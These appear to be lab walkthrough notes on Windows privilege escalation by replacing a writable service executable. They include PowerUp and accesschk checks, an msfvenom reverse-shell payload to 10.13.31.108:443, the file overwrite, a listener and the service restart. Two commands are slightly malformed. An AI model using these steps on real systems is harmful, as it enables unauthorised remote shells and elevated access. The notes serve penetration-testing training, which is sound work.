From powerup Invoke-AllChecks:

System running, and it seems we can abuse the service file, or the filepermservice.exe in this case.

accesschk64.exe /accepteula -uwqv "C:\Program Files\File Permissions Service\filepermservice.exe"

Get-Acl -Path "C:\Program Files\File Permissions Service\filepermservice.exe" | fl

move "C:\Program Files\File Permissions Service\filepermservice.exe" "C:\Program Files\File Permissions Service\filepermservice.exe.bak"

We can indeed do whatever we want with this exectuable, but if we just make a reverse shell and run it, we will still be in same user context. So we need to have the filepermsvc trigger it for us.

Let's inspect it's corresponding service details and see just what we can do with this information: (It's worth noting that sometimes it says auto start which means it starts up at reboot. So, if we can reset machine, we don't need the start service permission to trigger the service executable)

It seems we can stop and start this service too! That should be all we need for a privesc then! Let's create our payload.

msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.13.31.108 LPORT=443 -f exe -o reverse.exe

Next, we take our payload and place it over the service executable since we have the permissions needed:
copy reverse.exe "C:\Program Files\File Permissions Service\filepermservice.exe"

next, setup listener:
rlwrap -lvnp 443

then, start service to trigger shell:
net start filepermsvc
or
sq.exe start filepermsvc

![unnamed_4da07805533a413ba7e9e0807ef327f4](unnamed_4da07805533a413ba7e9e0807ef327f4.png)
![unnamed_1ab1ac9b00f84676a1ddfab6548d270d](unnamed_1ab1ac9b00f84676a1ddfab6548d270d.png)
![unnamed_65ce234c76f346cb9e2c2bdfeb7cb4ea](unnamed_65ce234c76f346cb9e2c2bdfeb7cb4ea.png)
![unnamed_623a421286324243a01d2270cf7b767c](unnamed_623a421286324243a01d2270cf7b767c.png)
